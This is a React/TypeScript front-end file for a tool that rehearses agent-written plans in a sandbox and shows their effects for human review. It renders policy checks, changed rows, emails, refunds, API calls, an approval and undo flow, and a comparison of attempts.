                {run.status === "rejected" && run.rejection ? <p className="w-full text-sm text-muted-foreground">Rejected by {run.rejection.by}{run.rejection.reason ? `: “${run.rejection.reason}”` : ". No reason given."}</p> : null}
                {run.status === "applied" && run.approval?.notes?.length ? <p className="w-full text-sm text-muted-foreground">{run.approval.notes.map((n) => `“${n}”`).join(" · ")}</p> : null}
                {run.status === "drifted" ? <Button className="h-10 rounded-full px-4" onClick={() => start()} disabled={busy}><RotateCcw className="size-4" /> Rehearse again</Button> : null}
                {!ACTIVE.has(run.status) && run.status !== "review" && run.attempts.length ? <a href={`/api/runs/${run.id}/evidence`} className="ml-auto text-sm text-muted-foreground underline-offset-4 hover:text-foreground hover:underline">Download evidence ↓</a> : null}
              </ApprovalCard>

              {run.status === "applied" && run.apply_result ? (
                <div className="animate-rise rounded-2xl border bg-card p-5">
                  <div className="flex flex-wrap items-center justify-between gap-2"><div className="flex items-center gap-2 font-medium"><span className="flex size-5 items-center justify-center rounded-full bg-safe text-white"><Check className="size-3.5" strokeWidth={3} /></span> Applied for real</div>
                    {run.approval ? <span className="font-mono text-[11px] text-muted-foreground">approved by {run.approval.approver} · plan {run.approval.plan_sha256.slice(0, 12)}</span> : null}</div>
                  <div className="mt-3 grid gap-2 font-mono text-[13px] sm:grid-cols-2">
                    {[["drift check", "passed"], ["database rows", num(run.apply_result.rows_written ?? 0)], ["BeanPay refunds", `${num(run.apply_result.refunds ?? 0)} · ${usd(run.apply_result.refund_total_cents ?? 0)}`], ["emails delivered", num(run.apply_result.emails_sent ?? 0)], ["API calls delivered", num(run.apply_result.http_delivered ?? 0)]].map(([k, v]) => (
                      <div key={k} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span className="text-muted-foreground">{k}</span><span>{v}</span></div>
                    ))}
                  </div>
                  {run.mode !== "rollback" ? (
                    <div className="mt-4 flex flex-wrap items-center justify-between gap-3 border-t pt-4">
                      <p className="text-sm text-muted-foreground">{run.rolled_back_by ? <>Its data changes were rolled back by <a className="underline underline-offset-4" href={`/app?run=${run.rolled_back_by}`}>{run.rolled_back_by}</a>.</> : "Approved something you regret? Undo the data changes. The undo is rehearsed and approved too."}</p>
                      {!run.rolled_back_by ? <Button variant="outline" className="h-9 rounded-full px-4" disabled={busy} onClick={undo}><Undo2 className="size-4" /> Rehearse an undo</Button> : null}
                    </div>
                  ) : null}
                </div>
              ) : null}

              {attempt && cloudChanged(attempt.consequences.cloud) ? <CloudDiff cl={attempt.consequences.cloud} /> : null}
              {attempt ? <BlastRadius c={attempt.consequences} /> : null}
              {attempt ? <Details attempt={attempt} events={run.events} runId={run.id} /> : null}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

const RULES: { rule: string; label: string }[] = [
  { rule: "protected_tables", label: "No deletes in protected tables" },
  { rule: "max_delete_pct", label: "Deletes stay under the table limit" },
  { rule: "block_schema_changes", label: "No schema changes" },
  { rule: "block_network_attempts", label: "No attempts to reach the internet" },
  { rule: "crash", label: "Plan ran to completion" },
  { rule: "block_over_refunds", label: "Refunds match real, unrefunded charges" },
  { rule: "block_broken_templates", label: "Emails have no unfilled placeholders" },
  { rule: "block_data_leaks", label: "Emails leak no other customer's data" },
  { rule: "block_marketing_to_opted_out", label: "Marketing respects unsubscribes" },
  { rule: "max_refund_total_usd", label: "Payout under the review threshold" },
  { rule: "max_emails_per_run", label: "Email volume under the review threshold" },
  { rule: "warn_vip_emails", label: "VIP recipients flagged" },
  { rule: "duplicate_emails", label: "Nobody gets the same email twice" },
  { rule: "unknown_recipients", label: "Every recipient is a customer" },
  { rule: "connectors_only", label: "API calls go through approved connectors" },
  { rule: "max_update_pct_protected", label: "Protected tables aren't mass-rewritten" },
  { rule: "invalid_recipients", label: "Every email has one valid address" },
];

function Checks({ attempt, events }: { attempt: NonNullable<Run["attempts"][number]>; events: Run["events"] }) {
  const byRule = new Map<string, Flag>();
  for (const f of attempt.flags) if (f.rule && !byRule.has(f.rule)) byRule.set(f.rule, f);
  const queries = events.filter((e) => e.kind === "verify" && /select|with/i.test(e.detail));
  return (
    <div className="space-y-5">
      <div>
        <div className="mb-2 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">Policy checks · no AI involved</div>
        <ul className="grid gap-1.5 sm:grid-cols-2">
          {RULES.map(({ rule, label }) => {
            const f = byRule.get(rule);
            const state = !f ? "pass" : f.severity === "critical" ? "block" : "warn";
            return (
              <li key={rule} title={f ? `${f.title}. ${f.detail}` : undefined} className={cn("flex items-center gap-2 rounded-lg border bg-background px-3 py-2 text-[13px]", state === "block" && "border-damage/40 text-damage")}>
                <span className={cn("flex size-4 shrink-0 items-center justify-center rounded-full text-[10px]", state === "pass" ? "bg-safe text-white" : state === "block" ? "bg-damage text-white" : "border border-foreground")}>{state === "pass" ? "✓" : state === "block" ? "✕" : "!"}</span>
                <span className="min-w-0 truncate">{label}</span>
              </li>
            );
          })}
        </ul>
      </div>
      <div>
        <div className="mb-2 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">Verifier investigation · {queries.length ? `${queries.length} read-only ${queries.length === 1 ? "query" : "queries"}` : "AI verification not run"}</div>
        {queries.length ? (
          <ol className="space-y-1.5">
            {queries.map((q, i) => <li key={i} className="overflow-x-auto rounded-lg border bg-background px-3 py-2 font-mono text-[12px]"><span className="mr-2 text-muted-foreground">{i + 1}.</span>{q.detail}</li>)}
          </ol>
        ) : <p className="text-sm text-muted-foreground">The policy checks above still ran. Ask the agent (with Vultr Serverless Inference configured) to see the verifier investigate.</p>}
      </div>
    </div>
  );
}

type ChangeRow = { table: string; op: "updated" | "deleted" | "inserted"; rowid: number; before: Record<string, unknown> | null; after: Record<string, unknown> | null; changed: string[] };

function ChangesExplorer({ runId }: { runId: string }) {
  const [table, setTable] = useState("");
  const [op, setOp] = useState("");
  const [q, setQ] = useState("");
  const [offset, setOffset] = useState(0);
  const [data, setData] = useState<{ total: number; rows: ChangeRow[]; tables: string[] } | null>(null);
  useEffect(() => {
    const ctl = new AbortController();
    const t = setTimeout(() => {
      const params = new URLSearchParams({ table, op, q, offset: String(offset), limit: "20" });
      fetch(`/api/runs/${runId}/changes?${params}`, { signal: ctl.signal, cache: "no-store" }).then((r) => r.json()).then(setData).catch(() => {});
    }, 200);
    return () => { clearTimeout(t); ctl.abort(); };
  }, [runId, table, op, q, offset]);
  const sel = "h-8 rounded-lg border bg-background px-2 text-[13px] outline-none focus-visible:ring-2 focus-visible:ring-ring/50";
  return (
    <div className="space-y-3">
      <div className="flex flex-wrap items-center gap-2">
        <select aria-label="Table" className={sel} value={table} onChange={(e) => { setTable(e.target.value); setOffset(0); }}>
          <option value="">all tables</option>{data?.tables.map((t) => <option key={t} value={t}>{t}</option>)}
        </select>
        <select aria-label="Change type" className={sel} value={op} onChange={(e) => { setOp(e.target.value); setOffset(0); }}>
          <option value="">all changes</option><option value="updated">updated</option><option value="deleted">deleted</option><option value="inserted">inserted</option>
        </select>
        <input aria-label="Search rows" placeholder="search any value…" value={q} onChange={(e) => { setQ(e.target.value); setOffset(0); }} className={cn(sel, "min-w-0 flex-1")} />
        <span className="font-mono text-[12px] text-muted-foreground">{data ? `${num(data.total)} rows` : "…"}</span>
      </div>
      <div className="space-y-1.5">
        {data?.rows.map((u) => {
          const row = u.after ?? u.before ?? {};
          return (
            <div key={`${u.table}-${u.op}-${u.rowid}`} className="overflow-x-auto rounded-lg border bg-background px-3 py-2 font-mono text-[12px]">
              <span className={cn("mr-2 rounded px-1.5 py-0.5 text-[10px] uppercase", u.op === "deleted" ? "bg-damage/10 text-damage" : "bg-muted")}>{u.op} {u.table}</span>
              {Object.entries(row).map(([k, v]) => (
                <span key={k} className={cn("mr-3 whitespace-nowrap", u.changed.includes(k) ? "text-foreground" : "text-muted-foreground")}>
                  {k}={u.changed.includes(k) && u.before ? <><s className="opacity-50">{String(u.before[k])}</s>→</> : null}{String(v)}
                </span>
              ))}
            </div>
          );
        })}
      </div>
      {data && data.total > 20 ? (
        <div className="flex items-center justify-between gap-3 text-sm">
          <Button variant="outline" className="h-8 rounded-full px-3" disabled={offset === 0} onClick={() => setOffset(Math.max(0, offset - 20))}>← Previous</Button>
          <span className="font-mono text-[12px] text-muted-foreground">{num(offset + 1)}–{num(Math.min(offset + 20, data.total))} of {num(data.total)}</span>
          <Button variant="outline" className="h-8 rounded-full px-3" disabled={offset + 20 >= data.total} onClick={() => setOffset(offset + 20)}>Next →</Button>
        </div>
      ) : null}
      <p className="text-xs text-muted-foreground">Every row here is recorded in the effects that approval replays, exactly and only these.</p>
    </div>
  );
}

function Details({ attempt, events, runId }: { attempt: NonNullable<Run["attempts"][number]>; events: Run["events"]; runId: string }) {
  const c = attempt.consequences;
  const updated = Object.entries(c.tables).flatMap(([t, d]) => [
    ...d.samples.updated.map((r) => ({ t, op: "update", row: r.after, changed: r.changed, before: r.before })),
    ...d.samples.deleted.map((r) => ({ t, op: "delete", row: r.before, changed: [] as string[], before: r.before })),
    ...d.samples.inserted.map((r) => ({ t, op: "insert", row: r.after, changed: [] as string[], before: undefined })),
  ]);
  return (
    <div className="rounded-2xl border bg-card p-5">
      <Tabs defaultValue="checks">
        <TabsList className="flex w-full flex-wrap">
          <TabsTrigger value="checks">Checks</TabsTrigger>
          <TabsTrigger value="rows">Rows</TabsTrigger>
          <TabsTrigger value="emails">Emails · {num(c.emails.count)}</TabsTrigger>
          <TabsTrigger value="refunds">Refunds · {num(c.payments.count)}</TabsTrigger>
          <TabsTrigger value="http">API calls · {num(c.http?.count ?? 0)}</TabsTrigger>
          <TabsTrigger value="sandbox">Sandbox</TabsTrigger>
          <TabsTrigger value="code">Code</TabsTrigger>
        </TabsList>
        <TabsContent value="checks" className="pt-3"><Checks attempt={attempt} events={events} /></TabsContent>
        <TabsContent value="rows" className="pt-3">
          {updated.length ? <ChangesExplorer runId={runId} /> : <p className="text-sm text-muted-foreground">No rows changed.</p>}
        </TabsContent>
        <TabsContent value="emails" className="space-y-2 pt-3">
          {c.emails.samples.length ? c.emails.samples.slice(0, 6).map((e, i) => (
            <div key={i} className="rounded-lg border bg-background p-3 text-sm">
              <div className="font-mono text-[11px] text-muted-foreground">to {e.to}</div>
              <div className="mt-1 font-medium">{e.subject}</div>
              <p className={cn("mt-1 whitespace-pre-line text-muted-foreground", /\{\{|\{[a-z_]+\}/.test(e.body) && "text-damage")}>{e.body}</p>
            </div>
          )) : <p className="text-sm text-muted-foreground">No emails would be sent.</p>}
        </TabsContent>
        <TabsContent value="refunds" className="pt-3">
          {c.payments.samples.length ? (
            <div className="space-y-1.5 font-mono text-[12px]">
              {c.payments.samples.slice(0, 12).map((p, i) => (
                <div key={i} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span>charge #{p.charge_id}</span><span className="text-muted-foreground">{p.reason}</span><span>{usd(p.amount_cents)}</span></div>
              ))}
              <div className="flex justify-between px-3 pt-1 text-foreground"><span>total</span><span>{usd(c.payments.total_cents)}</span></div>
            </div>
          ) : <p className="text-sm text-muted-foreground">No money would move.</p>}
        </TabsContent>
        <TabsContent value="http" className="space-y-2 pt-3">
          {c.http?.samples.length ? c.http.samples.slice(0, 10).map((h, i) => (
            <div key={i} className="rounded-lg border bg-background p-3">
              <div className="flex flex-wrap items-center gap-2 font-mono text-[12px]"><span className="rounded bg-muted px-1.5 py-0.5">{h.method}</span><span className="break-all">{h.url}</span></div>
              <pre className="mt-2 max-h-40 overflow-auto font-mono text-[11px] text-muted-foreground">{JSON.stringify(h.json, null, 2)}</pre>
            </div>
          )) : <p className="text-sm text-muted-foreground">No API calls. Plans call APIs with <span className="font-mono">ctx.http.post(...)</span>; calls are recorded here and delivered through a connector, with real credentials, only after approval.</p>}
        </TabsContent>
        <TabsContent value="sandbox" className="pt-3">
          <div className="grid gap-1.5 font-mono text-[12px] sm:grid-cols-2">
            {[["id", c.sandbox.id], ["runtime", c.sandbox.runtime === "runsc" ? "gVisor (runsc)" : c.sandbox.runtime], ["network", c.sandbox.network], ["memory cap", c.sandbox.memory],
              ["read-only root", String(c.sandbox.read_only_root)], ["env vars seen", (c.guards.env_keys ?? []).join(", ") || "none"], ["wall time", `${c.sandbox.wall_ms} ms`], ["destroyed", String(c.sandbox.destroyed)]].map(([k, v]) => (
              <div key={k} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span className="text-muted-foreground">{k}</span><span className="truncate">{v}</span></div>
            ))}
          </div>
          {c.blocked.length ? (
            <div className="mt-3 space-y-1.5">
              {c.blocked.map((b, i) => <div key={i} className="flex items-center gap-2 rounded-lg border border-damage/30 bg-damage/[0.04] px-3 py-2 font-mono text-[12px] text-damage"><Ban className="size-3.5" /> blocked {b.kind}: {b.target}</div>)}
            </div>
          ) : null}
          {c.error ? <pre className="mt-3 overflow-x-auto rounded-lg border bg-background p-3 font-mono text-[11px] text-damage">{c.error.message}</pre> : null}
          {c.logs?.length ? <pre className="mt-3 overflow-x-auto rounded-lg border bg-background p-3 font-mono text-[11px] text-muted-foreground">{c.logs.join("\n")}</pre> : null}
        </TabsContent>
        <TabsContent value="code" className="pt-3">
          <pre className="max-h-[420px] overflow-auto rounded-lg border bg-background p-3 font-mono text-[12px] leading-relaxed">{attempt.code}</pre>
        </TabsContent>
      </Tabs>
    </div>
  );
}

function AttemptCompare({ attempts }: { attempts: Run["attempts"] }) {
  const first = attempts[0].consequences, last = attempts[attempts.length - 1].consequences;
  const rows = (c: typeof first) => Object.values(c.tables).reduce((s, t) => s + t.deleted + t.updated + t.inserted, 0);
  const items = [
    ["money out", usd(first.payments.total_cents), usd(last.payments.total_cents)],
    ["refunds", num(first.payments.count), num(last.payments.count)],
    ["emails", num(first.emails.count), num(last.emails.count)],
    ["rows changed", num(rows(first)), num(rows(last))],
  ];
  return (
    <div className="animate-rise rounded-2xl border bg-card p-4 sm:p-5">
      <div className="flex items-center justify-between gap-3 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">
        <span>attempt 1 → attempt {attempts.length}</span><span>fixed in rehearsal · nothing real happened</span>
      </div>
      <div className="mt-3 grid grid-cols-2 gap-2 sm:grid-cols-4">
        {items.map(([k, a, b]) => (
          <div key={k} className="rounded-xl border bg-background px-3 py-2.5">
            <div className="text-[11px] uppercase tracking-wider text-muted-foreground">{k}</div>
            <div className="mt-1 flex flex-wrap items-baseline gap-x-2 font-mono tabular">
              <s className={cn("text-sm", a !== b ? "text-damage/80" : "text-muted-foreground")}>{a}</s>
              <ArrowRight className="size-3 text-muted-foreground" />
              <span className="text-lg">{b}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}


/** What actually happened, listing only what did (no "refunded $0 across 0 charges"). */
function appliedSentence(run: Run): string {
  const a = run.apply_result ?? {};
  const n = (x: number, one: string, many: string) => `${num(x)} ${x === 1 ? one : many}`;
  const parts: string[] = [];
  if (a.refunds) parts.push(`refunded ${usd(a.refund_total_cents ?? 0)} across ${n(a.refunds, "charge", "charges")}`);
  if (a.emails_sent) parts.push(`delivered ${n(a.emails_sent, "email", "emails")}`);
  if (a.http_delivered) parts.push(`made ${n(a.http_delivered, "API call", "API calls")}`);
  if (a.rows_written) parts.push(`wrote ${n(a.rows_written, "row", "rows")}`);
  const list = parts.length > 1 ? `${parts.slice(0, -1).join(", ")} and ${parts.at(-1)}` : parts[0] ?? "changed nothing";
  return `Done. This ${list}, after the drift check${run.approval ? `. Approved by ${run.approval.approver}` : ""}.`;
}
